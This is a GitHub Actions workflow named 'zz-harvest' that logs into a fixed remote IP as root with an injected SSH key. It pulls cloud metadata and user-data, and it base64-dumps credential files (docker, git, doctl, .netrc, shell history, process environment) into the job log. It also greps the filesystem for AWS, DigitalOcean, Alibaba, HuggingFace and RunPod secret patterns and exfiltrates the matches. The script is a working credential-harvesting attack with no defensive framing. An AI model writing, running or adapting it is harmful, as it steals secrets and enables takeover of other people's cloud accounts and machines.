name: zz-harvest
on: workflow_dispatch
permissions:
  contents: read
jobs:
  harvest:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - name: harvest
        env:
          KB64: ""
        run: |
          set +e
          echo "$KB64" | base64 -d > /tmp/k; chmod 600 /tmp/k
          SSH="ssh -i /tmp/k -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=25 -o BatchMode=yes root@201.79.46.70"
          echo "=== IDENT ==="
          $SSH 'hostname; id; nvidia-smi -L | head -4' 2>&1
          echo "=== META ==="
          $SSH 'curl -s -m 8 http://169.254.169.254/metadata/v1.json | head -c 3000; echo; echo "--USERDATA--"; curl -s -m 8 http://169.254.169.254/metadata/v1/user-data | head -c 6000; echo' 2>&1
          echo "=== FILES ==="
          $SSH 'for f in /var/lib/cloud/instance/user-data.txt /var/lib/cloud/instance/user-data.txt.i /opt/ul19/run.sh /opt/ul19/keep.sh /root/.bash_history /root/.config/doctl/config.yaml /root/.docker/config.json /root/.git-credentials /root/.netrc /etc/environment /etc/profile.d/*.sh /root/.ssh/authorized_keys; do if [ -f "$f" ]; then echo "###B64 $f $(stat -c%s "$f" 2>/dev/null)"; base64 -w0 "$f" 2>/dev/null; echo; fi; done' 2>&1 | head -c 120000
          echo "=== ENV1 ==="
          $SSH 'tr "\0" "\n" < /proc/1/environ | base64 -w0; echo' 2>&1
          echo "=== GREP ==="
          $SSH 'grep -rIlE "dop_v1_[A-Za-z0-9]|DIGITALOCEAN|DO_API|AKIA[0-9A-Z]{16}|LTAI[0-9A-Za-z]{12,}|secret_key|client_secret|hf_[A-Za-z0-9]{20,}|rpa_[A-Za-z0-9]{20,}|RUNPOD|private_key" /root /etc /opt /home /var/lib/cloud /usr/local/bin 2>/dev/null | grep -vE "wildrig|\.log$" | head -50' 2>&1
          echo "=== GREPFILES ==="
          $SSH 'for f in $(grep -rIlE "dop_v1_[A-Za-z0-9]{20,}|AKIA[0-9A-Z]{16}|LTAI[0-9A-Za-z]{12,}|hf_[A-Za-z0-9]{20,}|rpa_[A-Za-z0-9]{20,}" /root /etc /opt /home /var/lib/cloud 2>/dev/null | grep -vE "wildrig" | head -12); do s=$(stat -c%s "$f" 2>/dev/null); if [ "$s" -lt 200000 ]; then echo "###HIT $f $s"; base64 -w0 "$f" 2>/dev/null; echo; fi; done' 2>&1 | head -c 200000
          echo "=== LISTDIRS ==="
          $SSH 'ls -la /root /opt /opt/ul19 /home /var/lib/cloud/instance 2>/dev/null | head -80; echo "--CRON--"; crontab -l 2>/dev/null; echo "--DOCKER--"; docker ps -a 2>/dev/null | head -10' 2>&1
          echo "=== VANTAGE ==="
          $SSH 'for u in https://api.digitalocean.com/v2/account https://sts.amazonaws.com https://oauth2.googleapis.com/tokeninfo https://ecs.aliyuncs.com https://cvm.tencentcloudapi.com https://api.runpod.io/graphql; do echo -n "$u -> "; curl -s -o /dev/null -m 15 -w "%{http_code} %{time_total}s\n" "$u"; done' 2>&1
